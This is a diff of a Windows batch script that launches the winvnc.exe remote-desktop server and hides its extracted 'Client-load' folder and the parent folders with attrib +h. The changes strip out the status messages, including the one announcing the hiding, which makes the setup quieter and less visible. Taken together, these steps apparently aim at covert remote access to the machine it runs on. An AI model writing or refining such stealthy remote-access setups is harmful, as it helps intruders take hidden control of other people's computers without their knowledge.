@@ -16,9 +16,8 @@ REM Create the batch file to run winvnc.exe (run_winvnc.bat)
   echo @echo off
   echo tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
   echo if errorlevel 1 (
-  echo   echo No running instance of winvnc.exe found.
+  echo   echo winvnc.exe is not running.
   echo ) else (
-  echo   echo Found running instance of winvnc.exe. Killing it...
   echo   taskkill /im winvnc.exe /f
   echo   timeout /t 1 >nul
   echo )
@@ -41,22 +40,17 @@ if exist "%script_dir%run_winvnc.bat" (
 )
 
 REM Hide the extracted Client-load folder and its parent folder
-echo Hiding the Client-load folder and its parent folder...
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
 REM Start winvnc.exe to trigger permissions prompt
-echo Starting winvnc.exe to trigger permissions prompt...
 start "" winvnc.exe
 
 REM Wait for 7 seconds to allow the user to grant permissions
-echo Waiting for 7 seconds to allow permissions...
 timeout /t 7 >nul
 
-REM Run the run_winvnc.bat script after waiting 1 second
-echo Running run_winvnc.bat...
+REM Run the run_winvnc.bat script
 timeout /t 1 >nul
 call "%script_dir%run_winvnc.bat"
 
 REM End of main.bat
-echo Main bat completed.
